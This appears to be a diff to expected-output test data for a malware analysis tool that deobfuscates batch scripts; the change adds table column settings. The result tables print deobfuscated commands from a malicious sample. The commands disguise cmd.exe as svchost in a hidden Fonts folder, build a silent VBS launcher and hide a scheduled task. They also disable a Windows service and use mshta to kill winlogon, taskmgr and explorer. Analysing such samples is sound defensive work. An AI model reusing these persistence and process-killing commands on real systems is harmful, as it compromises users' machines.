@@ -6,6 +6,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"Command\": \"if /I \\\"%%j\\\"==\\\"explorer.exe\\\" set Date=%%i\", \"Normalized\": \"if /I \\\"%%j\\\"==\\\"explorer.exe\\\" set Date=%%i\"}, {\"Command\": \"if not exist \\\"%runroot%\\\\SOLA.VBS\\\" copy \\\"%sola%\\\\SOLA.VBS\\\" \\\"%runroot%\\\\SOLA.VBS\\\"\", \"Normalized [trun.]\": \"if not exist \\\"C:\\\\ProgramData\\\\\\u02bc\\u02f5\\\\\\\\\\\\SOLA.VBS\\\" copy \\\"C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\SOLA.VBS\\\" \\\"C:\\\\ProgramDat\"}, {\"Command\": \"if not exist %Taskroot%\\\\Tasks.job copy %setup%\\\\Tasks.xxx %Taskroot%\\\\Tasks.job\", \"Normalized [trun.]\": \"if not exist C:\\\\WINDOWS\\\\Tasks\\\\Tasks.job copy C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\solasetup\\\\Tasks.xxx C:\\\\WINDOW\"}]",
+        "body_config": {
+          "column_order": [
+            "Command",
+            "Normalized [trun.]"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +30,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"Command\": \"%SystemDrive%\", \"Normalized\": \"C:\"}, {\"Command\": \"%A0001% %systemroot%\\\\system32\\\\cmd.exe %sola%\\\\%svchost%\", \"Normalized\": \"copy C:\\\\WINDOWS\\\\system32\\\\cmd.exe C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\%%i\"}, {\"Command\": \"%A0002% %systemroot%\\\\Tasks\\\\Tasks.job -s -h -r\", \"Normalized\": \"attrib C:\\\\WINDOWS\\\\Tasks\\\\Tasks.job -s -h -r\"}, {\"Command\": \"%homedrive%\", \"Normalized\": \"C:\"}, {\"Command\": \"%A0003% On Error Resume Next>SOLA.VBS\", \"Normalized\": \"echo On Error Resume Next>SOLA.VBS\"}, {\"Command\": \"%A0003% set ws=wscript.createobject(\\\"wscript.shell\\\")>>SOLA.VBS\", \"Normalized\": \"echo set ws=wscript.createobject(\\\"wscript.shell\\\")>>SOLA.VBS\"}, {\"Command\": \"%A0003% ws.run \\\"%sola%\\\\svchost.exe /c %sola%\\\\SOLA.BAT -Run\\\",0 >>SOLA.VBS\", \"Normalized [trun.]\": \"echo ws.run \\\"C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\svchost.exe /c C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\SOLA.BAT -Run\\\" 0 >>S\"}, {\"Command\": \"%A0001% SOLA.VBS %sola%\\\\SOLA.VBS\", \"Normalized\": \"copy SOLA.VBS C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\SOLA.VBS\"}, {\"Command\": \"%A0003% NT>%systemroot%\\\\Fonts\\\\HIDESE~1\\\\NoTasks\", \"Normalized\": \"echo NT>C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\NoTasks\"}, {\"Command\": \"%A0002% %systemroot%\\\\Tasks\\\\Tasks.job +s +h +r\", \"Normalized\": \"attrib C:\\\\WINDOWS\\\\Tasks\\\\Tasks.job +s +h +r\"}, {\"Command\": \"%A0001% %setup%\\\\sleep.exe %systemroot%\\\\system32\\\\sleep.exe\", \"Normalized\": \"copy C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\solasetup\\\\sleep.exe C:\\\\WINDOWS\\\\system32\\\\sleep.exe\"}, {\"Command\": \"%A0003% Windows Registry Editor Version 5.00>%systemroot%\\\\Fonts\\\\HIDESE~1\\\\Regedit.reg\", \"Normalized\": \"echo Windows Registry Editor Version 5.00>C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\Regedit.reg\"}, {\"Command [trun.]\": \"%A0003% [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\ShellHWDetection]>>%systemroot%\\\\Fonts\\\\\", \"Normalized [trun.]\": \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\ShellHWDetection]>>C:\\\\WINDOWS\\\\Fonts\\\\HIDES\"}, {\"Command\": \"%A0003% \\\"Start\\\"=dword:00000004>>%systemroot%\\\\Fonts\\\\HIDESE~1\\\\Regedit.reg\", \"Normalized\": \"echo \\\"Start\\\"=dword:00000004>>C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\Regedit.reg\"}]",
+        "body_config": {
+          "column_order": [
+            "Command",
+            "Normalized"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -42,6 +54,13 @@
       {
         "auto_collapse": false,
         "body": "[{\"Source\": \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\", \"Destination\": \"C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\%%i\", \"Command\": \"copy C:\\\\WINDOWS\\\\system32\\\\cmd.exe C:\\\\WINDOWS\\\\Fonts\\\\HIDESE~1\\\\%%i\"}]",
+        "body_config": {
+          "column_order": [
+            "Source",
+            "Destination",
+            "Command"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -59,7 +78,8 @@
       },
       {
         "auto_collapse": false,
-        "body": "[[\"TABLE\", [{\"Command\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()\\\"\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.clos\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('C:\\\\\\\\~Install\\\\\\\\Install.bat %%1',0);window.c\"}]]]",
+        "body": "[[\"TABLE\", [{\"Command\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()\\\"\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.clos\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('C:\\\\\\\\~Install\\\\\\\\Install.bat %%1',0);window.c\"}], {}]]",
+        "body_config": {},
         "body_format": "MULTI",
         "classification": "TLP:C",
         "depth": 0,
